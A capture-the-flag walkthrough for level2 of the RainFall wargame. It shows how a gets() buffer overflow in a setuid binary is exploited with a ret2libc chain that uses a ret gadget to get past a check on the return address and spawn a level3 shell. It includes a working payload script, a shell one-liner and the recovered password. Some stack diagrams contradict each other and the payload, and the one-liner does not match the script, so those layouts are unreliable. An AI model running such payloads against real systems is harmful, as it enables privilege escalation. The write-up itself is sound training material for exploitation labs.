# Level2 Walkthrough
### Complete Step-by-Step Guide with Memory Layout Analysis

### 🎯 Objective
This walkthrough demonstrates how to exploit a buffer overflow vulnerability in the `level2` binary to gain elevated privileges and retrieve the flag. This is an educational exercise in understanding memory corruption vulnerabilities and their exploitation techniques.

---

## 🔍 Initial Reconnaissance

Let's start by examining our environment and understanding what we're working with:

```bash
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep  3  2015 .bashrc
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
```

### Key Observations:
- **SUID Binary**: The `level2` binary has the setuid bit (`s`) set and is owned by `level3`
- **Privilege Escalation Target**: When executed, this binary runs with `level3` user privileges

Let's test the basic functionality:
```bash
level2@RainFall:~$ ./level2
[Waits for input]
Hello World
Hello World
```

The program appears to read input and echo it back, suggesting it might be vulnerable to input-based attacks.

---

## 🔍 Binary Analysis

Now let's dive deep into the binary using GDB to understand its internal structure:

```bash
level2@RainFall:~$ gdb -q level2
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

The `main` function is simple - it just calls function `p()`. Let's examine the critical function:

```bash
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp          # Allocate 104 bytes on stack
   0x080484da <+6>:	mov    0x8049860,%eax      # Load stdout
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax    # Load buffer address (EBP-76)
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>   # VULNERABLE gets() call
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax      # Load return address
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)     # Store return address
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax     # Load return address
   0x080484fb <+39>:	and    $0xb0000000,%eax    # Check if address starts with 0xb
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>    # Jump if NOT starting with 0xb
   0x08048507 <+51>:	mov    $0x8048620,%eax     # Address detection message
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>  # Print detected address
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>   # Exit if 0xb detected
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

---

## 🚨 Vulnerability Assessment

### Critical Findings:

1. **Buffer Overflow Vulnerability**: 
   - The `gets()` function at `0x080484ed` is inherently unsafe
   - It reads unlimited input into a fixed-size buffer
   - No bounds checking is performed

2. **Buffer Location and Size**:
   - Buffer starts at `EBP-76` (`-0x4c` = -76 in decimal)
   - Stack frame allocates 104 bytes (`0x68`)

3. **Security Mechanism**:
   - Program checks if return address starts with `0xb`
   - This prevents direct returns to libc functions (which typically start with `0xb`)
   - If detected, program prints the address and exits

---

## 🧠 Memory Layout Understanding

Let's visualize the stack layout to understand the exploitation strategy:

```
High Memory Addresses
┌─────────────────────┐
│    Function Args    │
├─────────────────────┤
│   Return Address    │  ← EBP+4 (Target for overwrite)
├─────────────────────┤
│    Saved EBP        │  ← EBP
├─────────────────────┤
│                     │
│   Local Variables   │  ← 28 bytes (104-76)
│                     │
├─────────────────────┤
│                     │
│                     │
│      Buffer         │  ← EBP-76 (gets() writes here)
│    [76 bytes]       │
│                     │
│                     │
└─────────────────────┘
Low Memory Addresses
```

### Detailed Stack Analysis:

```
Stack Layout During p() Function Execution:

Address     Content                Size    Description
─────────────────────────────────────────────────────────
EBP+4      [Return Address]       4       Where p() returns to main
EBP+0      [Saved EBP]           4       Previous frame pointer
EBP-4      [Local Variables]      |
EBP-8      ...                    |       28 bytes of local vars
...        ...                    |       (including stored ret addr)
EBP-28     [End Local Vars]      ─┘
EBP-29     [Unused Space]         |
...        ...                    |       47 bytes unused
EBP-75     [Unused Space]        ─┘
EBP-76     [Buffer Start]         |
...        [User Input]           |       76 bytes buffer
EBP-151    [Buffer End]          ─┘
```

### Buffer Overflow Impact:

When we provide more than 76 bytes of input:
```
Input: "A" * 80 + "BBBB" + "CCCC"

Memory After Overflow:
EBP+4:  [CCCC]     ← Return address overwritten
EBP+0:  [BBBB]     ← Saved EBP overwritten  
EBP-76: [AAAA...A] ← Buffer filled with A's
```

---

## 🎯 Address Discovery

We need to find specific memory addresses for our exploit. Let's use GDB to locate them:

```bash
level2@RainFall:~$ gdb -q level2
(gdb) break main
Breakpoint 1 at 0x804853f
(gdb) run
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x0804853f in main ()
```

### Finding Critical Addresses:

1. **System Function Address**:
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

2. **Exit Function Address**:
```bash
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

3. **"/bin/sh" String Location**:
```bash
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

4. **Return Instruction Address**:
```bash
(gdb) disassemble main
Dump of assembler code for function main:
   .
   .
   .
   0x0804854b <+12>:	ret    ← This address: 0x0804854b
End of assembler dump.
```

### Address Summary:
| Function/String | Address    | Starts with 0xb? | Blocked by Check? |
|----------------|------------|-------------------|-------------------|
| system()       | 0xb7e6b060 | ✅ Yes            | ✅ Yes            |
| exit()         | 0xb7e5ebe0 | ✅ Yes            | ✅ Yes            |
| "/bin/sh"      | 0xb7f8cc58 | ✅ Yes            | N/A (data)        |
| ret instruction| 0x0804854b | ❌ No             | ❌ No             |

---

## 🛡️ Security Mechanism Analysis

The program implements a simple but effective protection:

```assembly
mov    0x4(%ebp),%eax      # Load return address from stack
mov    %eax,-0xc(%ebp)     # Store it locally
mov    -0xc(%ebp),%eax     # Load it back
and    $0xb0000000,%eax    # Mask to check first nibble
cmp    $0xb0000000,%eax    # Compare with 0xb0000000
jne    0x8048527 <p+83>    # Jump if NOT 0xb0000000
```

### How the Check Works:

1. **Extracts return address** from stack position `EBP+4`
2. **Applies bitmask** `0xb0000000` to isolate the first nibble
3. **Compares result** to `0xb0000000`
4. **If match found**: Address starts with `0xb` → Print and exit
5. **If no match**: Continue execution normally

### Why This Matters:

Most libc functions (including `system()`) are loaded in memory regions starting with `0xb`, making direct return-to-libc attacks impossible.

### Our Bypass Strategy:

We'll use **Return-Oriented Programming (ROP)** with a gadget that doesn't start with `0xb`:
- Return to `ret` instruction at `0x0804854b`
- This instruction will pop the next stack value into EIP
- Allowing us to indirectly call `system()`

---

## � Why Shellcode Injection Can't Be Used

Using GDB, we can inspect the stack when the vulnerable function `p()` is called:

```bash
(gdb) break p
Breakpoint 1 at 0x80484da
(gdb) run
Breakpoint 1, 0x080484da in p ()
(gdb) info frame
Stack level 0, frame at 0xbffff730:
eip = 0x80484da in p; saved eip 0x804854a
saved registers:
ebp at 0xbffff728, eip at 0xbffff72c
(gdb) x/40x $ebp-0x50
0xbffff6d8: … 0xbffff6e8: 0xbffff73c … 0xbffff728: 0xbffff738 0x0804854a …
```

From this, we see:

- The **buffer** is at `0xbffff6e4` (stack addresses starting with `0xb…`).
- The **saved EBP** is at `0xbffff728`.
- The **return address (EIP)** is at `0xbffff72c` → currently `0x0804854a`.

The program checks the return address after the function call. If it starts with `0xb…`, it exits. Therefore, trying to overwrite the return address with a pointer to our shellcode on the stack (e.g., `0xbffff6e4`) would immediately trigger this check and terminate the program.

Because of this restriction, classic stack-based shellcode injection is blocked. Instead, techniques like **ret2libc** or **ROP** are required, which redirect execution to existing functions in the binary or libc (e.g., `system()`) without using stack addresses starting with `0xb…`.

### Detailed Memory Layout with Real Addresses

Based on our GDB analysis, here's the actual memory layout during the vulnerable `p()` function:

```
Memory Layout During p() Function Execution:
(Stack grows downward ↓)

Higher Memory Addresses
┌─────────────────────────────────────┐ 0xbffff72c
│        Return Address               │ ← EBP+4 (currently 0x0804854a)
│      [4 bytes]                      │   Target for ROP chain
├─────────────────────────────────────┤ 0xbffff728
│        Saved EBP                    │ ← EBP+0 (frame pointer)
│      [4 bytes]                      │   
├─────────────────────────────────────┤ 0xbffff724
│                                     │
│      Local Variables                │ ← EBP-4 to EBP-28
│    (stored return addr, etc)        │   [28 bytes total]
│                                     │
├─────────────────────────────────────┤ 0xbffff700
│                                     │
│       Unused Stack Space            │ ← EBP-29 to EBP-75
│      [47 bytes padding]             │   [47 bytes unused]
│                                     │
├─────────────────────────────────────┤ 0xbffff6e4
│                                     │ ← EBP-76 (gets() target)
│                                     │   Buffer starts here
│        Input Buffer                 │   📍 SHELLCODE WOULD GO HERE
│      [76 bytes total]               │   ❌ But address starts with 0xb!
│                                     │   ❌ Security check blocks this!
│                                     │
└─────────────────────────────────────┘ 0xbffff6a0
Lower Memory Addresses

Stack Addresses Analysis:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Buffer:     0xbffff6e4  ← Starts with 0xb ❌
Saved EBP:  0xbffff728  ← Starts with 0xb ❌  
Return:     0xbffff72c  ← Starts with 0xb ❌
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚫 ALL stack addresses start with 0xb → Security check triggers!
✅ Solution: Use ROP with addresses starting with 0x08...
```

### Why Stack Addresses Are Blocked

```
Overflow Attempt with Shellcode:
┌─────────────────────────────────────┐
│  Payload: "A" * 76 + buffer_addr    │
│           "A" * 76 + 0xbffff6e4     │ ← Shellcode address  
└─────────────────────────────────────┘
                      │
                      ▼
            ┌─────────────────────┐
            │  Security Check:    │
            │  if (ret_addr &     │  
            │      0xb0000000)    │
            │    exit(1);         │ ← BLOCKED!
            └─────────────────────┘

ROP Chain Solution:
┌─────────────────────────────────────┐
│  Payload: "A" * 76 + ret_gadget     │
│           "A" * 76 + 0x0804854b     │ ← ret instruction
└─────────────────────────────────────┘
                      │
                      ▼
            ┌─────────────────────┐
            │  Security Check:    │
            │  if (0x08048... &   │
            │      0xb0000000)    │
            │    continue;        │ ← PASSES!
            └─────────────────────┘
```

---

## �💻 Exploit Development

### ROP Chain Strategy:

```
Stack Layout After Overflow:

Position    Content              Purpose
─────────────────────────────────────────────────────────
EBP+8      [0xb7f8cc58]        "/bin/sh" address (arg to system)
EBP+4      [0x0804854b]        ret instruction (for stack alignment)
EBP+0      [0xb7e6b060]        system() address
EBP-4      [0x0804854b]        ret instruction address (initial return)
EBP-8      ["BBBB"]            Saved EBP overwrite (arbitrary)
EBP-12     ["AAAA"]            |
...        ["AAAA"]            | Buffer padding (76 bytes)
EBP-84     ["AAAA"]            |
```

### Execution Flow:

1. **Buffer overflow** overwrites return address with `0x0804854b`
2. **First ret instruction** executes, popping `system()` address into EIP
3. **System() executes** with "/bin/sh" as argument
4. **Shell spawned** with level3 privileges

### Visual Execution Flow:

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   p() returns   │───▶│  ret @ 0x0804   │───▶│  system() call  │
│  to 0x0804854b  │    │  pops system    │    │  with "/bin/sh" │
└─────────────────┘    │  from stack     │    └─────────────────┘
                       └─────────────────┘
```

---

## 🔨 Payload Construction

Let's build our exploit payload step by step:

```python
import struct

# Discovered addresses
system_addr = 0xb7e6b060    # system() function
binsh_addr = 0xb7f8cc58     # "/bin/sh" string
ret_addr = 0x0804854b       # ret instruction in main

# Payload construction
payload = ""
payload += "A" * 76                               # Fill 76-byte buffer
payload += "BBBB"                                 # Overwrite saved EBP
payload += struct.pack("<I", ret_addr)            # Return to ret instruction
payload += struct.pack("<I", system_addr)         # system() address
payload += struct.pack("<I", ret_addr)            # Return address for system
payload += struct.pack("<I", binsh_addr)          # "/bin/sh" argument

print("Payload length:", len(payload))
print("Payload bytes:", repr(payload))
```

### Payload Breakdown:

| Component | Size | Value | Purpose |
|-----------|------|-------|---------|
| Buffer padding | 76 bytes | "A" * 76 | Fill buffer to reach saved EBP |
| EBP overwrite | 4 bytes | "BBBB" | Overwrite saved EBP (arbitrary) |
| Return address | 4 bytes | 0x0804854b | Point to ret instruction |
| System address | 4 bytes | 0xb7e6b060 | Address ret instruction jumps to |
| Return for system | 4 bytes | 0x0804854b | Where system() returns (cleanup) |
| System argument | 4 bytes | 0xb7f8cc58 | "/bin/sh" string for system() |

**Total payload size**: 96 bytes

### Memory Layout Review - What Happens During Exploitation

Here's a detailed view of the stack transformation when our payload is executed:

```

AFTER OVERFLOW - Exploited Stack Layout:
┌─────────────────────────────────────┐ 0xbffff730
│     "/bin/sh" String Address        │ ← EBP+8: 0xb7f8cc58 (system arg)
│     [0xb7f8cc58]                    │
├─────────────────────────────────────┤ 0xbffff72c
│     ret Instruction (cleanup)       │ ← EBP+4: 0x0804854b (return addr)
│     [0x0804854b]                    │   🎯 HIJACKED!
├─────────────────────────────────────┤ 0xbffff728
│     system() Function Address       │ ← EBP+0: 0xb7e6b060 (was saved EBP)
│     [0xb7e6b060]                    │   🎯 OVERWRITTEN!
├─────────────────────────────────────┤ 0xbffff724
│     ret Instruction Address         │ ← EBP-4: 0x0804854b (initial target)
│     [0x0804854b]                    │   🎯 OVERWRITTEN!
├─────────────────────────────────────┤ 0xbffff720
│     "BBBB" (EBP overwrite)          │ ← EBP-8: Arbitrary data
│     [0x42424242]                    │   🎯 OVERWRITTEN!
├─────────────────────────────────────┤ 0xbffff6e4
│     "AAAA...AAAA" (76 bytes)        │ ← EBP-76: Buffer filled with A's
│     [0x41414141] x19                │   🎯 BUFFER OVERFLOW!
│                                     │
└─────────────────────────────────────┘

Execution Flow After Overflow:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Step 1: p() function returns
        └─> EIP = 0x0804854b (ret instruction)
        
Step 2: ret instruction executes  
        └─> Pops 0xb7e6b060 from stack into EIP
        └─> EIP now points to system() function
        
Step 3: system() function executes
        └─> Takes 0xb7f8cc58 ("/bin/sh") as argument
        └─> Spawns shell with level3 privileges
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Stack Pointer Movement During ROP:
┌─────────────────────────────────────┐
│ ESP before ret: → 0xbffff728        │ Points to system() address
│ ESP after ret:  → 0xbffff72c        │ Points to return address  
│ ESP in system:  → 0xbffff730        │ Points to "/bin/sh" argument
└─────────────────────────────────────┘
```


---

## 🚀 Execution and Flag Retrieval

Now let's execute our exploit:

```bash
level2@RainFall:~$ (python -c '
import struct

system_addr = 0xb7e6b060
binsh_addr = 0xb7f8cc58
ret_addr = 0x0804854b

payload = "A" * 76
payload += "BBBB"
payload += struct.pack("<I", ret_addr)
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", ret_addr)
payload += struct.pack("<I", binsh_addr)

print payload
'; cat) | ./level2
```

Single Line:

```bash
(python -c 'import struct; system_addr=0xb7e6b060; binsh_addr=0xb7f8cc58; ret_addr=0x0804854b; payload="A"*80; payload+=struct.pack("<I",ret_addr); payload+=struct.pack("<I",system_addr); payload+=struct.pack("<I",system_addr); payload+=struct.pack("<I",binsh_addr); print(payload)' ; cat) | ./level2

```

### What Happens During Execution:

1. **Payload sent** to vulnerable program
2. **Buffer overflow** occurs, overwriting stack
3. **Return address check** passes (0x0804854b doesn't start with 0xb)
4. **ROP chain executes**:
   - Returns to ret instruction
   - ret pops system() address into EIP
   - system("/bin/sh") executes
5. **Shell spawns** with level3 privileges

### Retrieving the Flag:

```bash
# Now we have a shell as level3 user
ls
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## 🎉 Success!

**Flag for level3**: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`

To continue to the next level:
```bash
su level3
# Enter password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
